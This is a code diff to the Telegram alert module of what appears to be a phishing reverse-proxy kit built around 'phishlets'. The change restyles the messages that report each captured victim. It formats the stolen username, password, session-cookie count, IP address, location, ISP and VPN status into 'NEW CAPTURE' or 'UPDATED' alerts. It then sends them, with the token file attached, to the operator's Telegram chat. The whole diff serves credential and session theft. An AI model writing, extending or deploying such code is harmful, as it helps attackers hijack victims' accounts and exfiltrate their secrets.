@@ -221,29 +221,37 @@ func parseUserAgent(ua string) string {
 	return browser + " / " + os
 }
 
-func formatSessionMessage(session TSession) string {
-	user := TelegramMarkdownV2Escape(session.Username)
-	pass := TelegramMarkdownV2Escape(session.Password)
-	ip := TelegramMarkdownV2Escape(session.RemoteAddr)
-	pl := TelegramMarkdownV2Escape(strings.ToUpper(session.Phishlet))
-	ua := TelegramMarkdownV2Escape(parseUserAgent(session.UserAgent))
+func formatSessionMessage(session TSession, updated bool) string {
+	e := TelegramMarkdownV2Escape
 
-	ts := time.Unix(session.CreateTime, 0).UTC().Format("02 Jan 2006 · 15:04 UTC")
-	tsEsc := TelegramMarkdownV2Escape(ts)
+	pl := e(strings.ToUpper(session.Phishlet))
+	user := session.Username
+	if user == "" {
+		user = "—"
+	}
+	pass := session.Password
+	if pass == "" {
+		pass = "—"
+	}
+
+	title := "🎯 *NEW CAPTURE*"
+	if updated {
+		title = "🔄 *UPDATED*"
+	}
 
 	tokCount := countTokens(session.Tokens)
-	tokLine := fmt.Sprintf("%d cookies captured", tokCount)
+	cookieBit := fmt.Sprintf("🍪 %d cookies", tokCount)
 	if tokCount == 0 {
-		tokLine = "none yet"
+		cookieBit = "🍪 none"
 	}
-	tokLineEsc := TelegramMarkdownV2Escape(tokLine)
+	ts := time.Unix(session.CreateTime, 0).UTC().Format("02 Jan · 15:04 UTC")
 
-	// Geo data from custom fields
-	geoLine := TelegramMarkdownV2Escape("Unknown")
-	ispLine := TelegramMarkdownV2Escape("—")
-	vpnLine := TelegramMarkdownV2Escape("No")
-	flagEmoji := "🌐"
+	lines := []string{
+		title + " · `" + pl + "`",
+		"`" + e(user) + "`  ·  `" + e(pass) + "`",
+	}
 
+	// location / network -------------------------------------------------
 	if session.Custom != nil {
 		cc, _ := session.Custom["geo_country_code"].(string)
 		country, _ := session.Custom["geo_country_name"].(string)
@@ -258,65 +266,38 @@ func formatSessionMessage(session TSession) string {
 			if city != "" {
 				loc = city + ", " + country
 			}
-			geoLine = TelegramMarkdownV2Escape(loc)
-			flagEmoji = countryFlag(cc)
+			lines = append(lines, "🌍 "+countryFlag(cc)+" "+e(loc))
 		}
 		if isp != "" {
-			ispStr := isp
+			org := isp
 			if asn != "" {
-				ispStr = "AS" + asn + " · " + isp
+				org = "AS" + asn + " " + isp
 			}
-			ispLine = TelegramMarkdownV2Escape(ispStr)
-		}
-		if isVPN == "true" || isDC == "true" {
-			labels := []string{}
+			tag := ""
 			if isVPN == "true" {
-				labels = append(labels, "VPN")
+				tag = " · VPN"
+			} else if isDC == "true" {
+				tag = " · DC"
 			}
+			lines = append(lines, "🏢 "+e(org)+e(tag))
+		} else if isVPN == "true" || isDC == "true" {
+			tag := "VPN"
 			if isDC == "true" {
-				labels = append(labels, "Datacenter")
+				tag = "Datacenter"
 			}
-			vpnLine = TelegramMarkdownV2Escape(strings.Join(labels, " + "))
+			lines = append(lines, "🛡️ "+e(tag))
 		}
 	}
 
-	sep := TelegramMarkdownV2Escape("━━━━━━━━━━━━━━━━━━━━━━")
-
-	return fmt.Sprintf(
-		"🎯 *CAPTURE* · %s\n\n"+
-			"%s\n"+
-			"*CREDENTIALS*\n"+
-			"%s\n"+
-			"User   `%s`\n"+
-			"Pass   `%s`\n\n"+
-			"%s\n"+
-			"*LOCATION*\n"+
-			"%s\n"+
-			"%s  `%s`\n"+
-			"📡  `%s`\n"+
-			"🛡️  `%s`\n"+
-			"🖥️  `%s`\n"+
-			"🌐  `%s`\n\n"+
-			"%s\n"+
-			"*SESSION*\n"+
-			"%s\n"+
-			"📅  `%s`\n"+
-			"🍪  `%s`\n"+
-			"📎 _Tokens attached_\n",
-		pl,
-		sep, sep,
-		user, pass,
-		sep, sep,
-		flagEmoji, geoLine,
-		ispLine,
-		vpnLine,
-		ua,
-		ip,
-		sep, sep,
-		tsEsc,
-		tokLineEsc,
+	lines = append(lines,
+		"🖥️ "+e(parseUserAgent(session.UserAgent)),
+		"🌐 `"+e(session.RemoteAddr)+"`",
+		cookieBit+" · 🕒 "+e(ts),
 	)
+
+	return strings.Join(lines, "\n")
 }
+
 
 func Notify(session TSession, chatid string, teletoken string) {
 	// Use the UUID-based SessionID as the deduplication key, not the integer ID
@@ -337,7 +318,7 @@ func Notify(session TSession, chatid string, teletoken string) {
 				fmt.Println("Error creating TXT file for update:", err)
 				return
 			}
-			msg_body := formatSessionMessage(session)
+			msg_body := formatSessionMessage(session, true)
 			err = editMessageFile(chatid, teletoken, messageID, txtFilePath, msg_body)
 			if err != nil {
 				fmt.Printf("Error editing message: %v\n", err)
@@ -368,7 +349,7 @@ func Notify(session TSession, chatid string, teletoken string) {
 	}
 
 	// Format the message
-	message := formatSessionMessage(session)
+	message := formatSessionMessage(session, false)
 
 	// Send the notification and get the message ID
 	messageID, err := sendTelegramNotification(chatid, teletoken, message, txtFilePath)
